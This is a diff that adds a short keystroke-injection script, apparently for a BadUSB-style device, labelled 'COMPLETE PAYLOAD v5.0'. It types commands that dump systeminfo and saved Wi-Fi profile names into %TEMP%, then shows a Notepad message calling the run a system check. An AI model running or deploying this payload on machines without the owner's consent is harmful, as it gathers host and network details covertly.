@@ -1,0 +1,33 @@
+REM ============================================================
+REM COMPLETE PAYLOAD v5.0
+REM Quick system info dump
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 800
+
+STRING systeminfo > %TEMP%\systeminfo.txt && echo Done!
+ENTER
+DELAY 1500
+
+STRING netsh wlan show profiles | findstr ":" > %TEMP%\wifi_list.txt
+ENTER
+DELAY 800
+
+STRING exit
+ENTER
+DELAY 300
+
+REM --- Open Notepad with message ---
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+STRING System checked successfully.
+ENTER
+STRING Check %TEMP% folder for results.
